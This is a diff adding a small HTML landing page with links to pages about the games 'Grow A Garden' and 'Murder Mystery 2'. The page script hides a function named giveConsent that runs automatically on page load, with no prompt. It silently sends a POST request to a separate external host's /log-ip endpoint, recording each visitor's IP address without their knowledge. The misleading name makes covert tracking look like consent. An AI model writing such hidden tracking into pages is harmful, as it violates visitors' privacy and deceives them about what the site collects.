@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sections</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    background: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: white;
+    font-family: Arial, sans-serif;
+    position: relative;
+  }
+  
+  h1 {
+    font-size: 3rem;
+    opacity: 0;
+    transition: opacity 2s ease;
+  }
+
+  #sections-text {
+    font-size: 1.5rem;
+    margin-top: 10px;
+    opacity: 0;
+    transition: opacity 2s ease;
+  }
+
+  .buttons {
+    margin-top: 20px;
+    opacity: 0;
+    transition: opacity 2s ease;
+    display: flex;
+    gap: 20px;
+  }
+
+  button {
+    padding: 10px 25px;
+    font-size: 1.2rem;
+    cursor: pointer;
+    background-color: #222;
+    border: 2px solid white;
+    color: white;
+    border-radius: 6px;
+  }
+  button:hover {
+    background-color: white;
+    color: black;
+  }
+
+  .credits {
+    position: fixed;
+    bottom: 10px;
+    width: 100%;
+    text-align: center;
+    font-size: 0.9rem;
+    color: white;
+    opacity: 0.2;
+    user-select: none;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+
+<h1 id="title">Welcome!</h1>
+<div id="sections-text">Sections</div>
+
+<div class="buttons" id="buttons">
+  <button onclick="window.location.href='https://cross-buy.up.railway.app/growagarden/base.html'">Grow A Garden</button>
+  <button onclick="window.location.href='https://cross-buy.up.railway.app/murdermystery2/sections.html'">Murder Mystery 2</button>
+</div>
+
+<div class="credits">© 2025 happycat5855</div>
+  <script>
+    function giveConsent() {
+      fetch('https://website2-production-17e5.up.railway.app/log-ip', {
+        method: 'POST',
+      }).then(() => {
+        console.log("done")
+      }).catch(() => {
+        console.log("failed")
+      });
+    }
+  </script>
+<script>
+
+  const title = document.getElementById('title');
+  const sectionsText = document.getElementById('sections-text');
+  const buttons = document.getElementById('buttons');
+
+  window.onload = () => {
+    title.style.opacity = 1;
+    giveConsent()
+    setTimeout(() => {
+      sectionsText.style.opacity = 1;
+    }, 2000);
+
+    setTimeout(() => {
+      buttons.style.opacity = 1;
+    }, 2000);
+  };
+</script>
+
+</body>
+</html>
